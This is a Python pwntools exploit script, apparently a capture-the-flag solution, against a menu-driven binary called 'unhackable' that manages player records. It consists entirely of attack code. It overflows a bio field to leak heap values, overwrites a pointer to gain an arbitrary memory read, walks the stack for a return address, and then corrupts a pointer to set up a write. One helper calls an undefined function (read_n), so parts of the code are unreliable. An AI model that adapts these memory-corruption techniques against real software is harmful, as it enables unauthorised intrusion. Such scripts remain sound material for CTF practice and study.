from pwn import *
import sys
import struct

def choice_prompt():
    p.recvuntil('hoice> ')

def byter(s):
    if type(s) != bytes:
        s = s.encode("utf-8")
    assert(b'\n' not in s)
    return s
    
    
def new_player(player_name="", bio_length=0, bio=""):
    player_name = byter(player_name)
    bio = byter(bio)
    
    choice_prompt()
    p.sendline("1")
    p.recvuntil("Name: ")
    p.sendline(player_name)
    p.recvuntil("Bio length: ")
    p.sendline(str(bio_length))
    if bio_length!=0:
        p.recvuntil("Bio: ")
        p.sendline(bio)

def edit_player(index, new_name, new_bio=""):
    new_name = byter(new_name)
    new_bio = byter(new_bio)

    choice_prompt()
    p.sendline("2")
    p.recvuntil("Select index: ")
    p.sendline(str(index))
    p.recvuntil("Enter new name: ")
    p.sendline(new_name)
    if len(new_bio)>0:
        p.recvuntil("Enter new bio: ")
        p.sendline(new_bio)
        
def print_player(index, expect_bio):
    choice_prompt()
    p.sendline("3")
    p.recvuntil("Select index: ")
    p.sendline(str(index))
    p.recvuntil("Name: ")
    name = p.recvuntil("\n", drop=True)
    bio=""
    if expect_bio:
        p.recvuntil("Bio: ")
        bio = p.recvuntil("\n\n", drop=True)
    return (name, bio)

def delete_player(index):
    choice_prompt()
    p.sendline("4")
    p.recvuntil("Select index: ")
    p.sendline(str(index))

def read_mem(addr):
    edit_player(0, "ae", b"a"*16+p64(32)+p64(addr)[:7])
    return print_player(1, True)[1]    

def read_mem_addr(addr):
    return u64(read_mem(addr).ljust(8, b'\x00'))

def read_addr(addr):
    def sign_extend(n):
        return n | ((~((1<<48)-1)) * (n >> 47))
    
    return sign_extend(u64(read_n(addr, 6).ljust(8, b'\x00')))
    

def read_all(timeout=4):
    data = b""
    while p.can_recv(timeout=timeout):
        data += p.recv()
    return data



context.arch = 'amd64'
context.terminal = ["tmux", "splitw", "-h"]

if args['HOST'] and args['PORT']:
    p = remote(args['HOST'], int(args['PORT']))
else:
    p = process(["./unhackable"], aslr=False)

#gdb.attach(p, '''
#   b EditPlayer
#   continue
#''')
new_player("A", 32, b"A"*31)
player_info=print_player(0, True)
inuseLabel=u64(player_info[1][32:].ljust(8, b'\x00'))
callStack=inuseLabel-20
delete_player(0)

print("inuse =", hex(inuseLabel))
print("callStack =", hex(callStack))

new_player("A2", 0)
new_player("B", 32, "b1")
delete_player(0)
new_player("A3", 32, "a"*23)


#heap_addr=u64(print_player(0,True)[1][24:].ljust(8, b'\x00'))
print(print_player(0, True))
print(print_player(1, True))

addr=callStack
for i in range(40):
    ret_addr=read_mem_addr(addr)
    if ret_addr&0xfff==0xca7 or ret_addr&0xfff==0x2a7:
        break
    addr=read_mem_addr(addr+8)

new_player("C", 32, b"C"*24+p64(addr+1))
delete_player(2)
new_player("C1", 0)
new_player("D", 0)
edit_player(3, b"c"*24, "")
print(read_all())

